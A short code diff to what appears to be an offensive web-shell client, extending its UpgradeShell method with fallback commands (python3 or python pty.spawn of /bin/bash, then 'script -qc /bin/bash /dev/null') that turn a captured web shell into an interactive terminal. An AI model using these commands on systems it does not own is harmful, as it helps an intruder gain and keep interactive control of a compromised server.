@@ -76,7 +76,7 @@ class WebShell(object):
 
     def UpgradeShell(self):
         # upgrade shell
-        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
+        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
         self.WriteCmd(UpgradeShell)
 
 prompt = "Please Subscribe> "
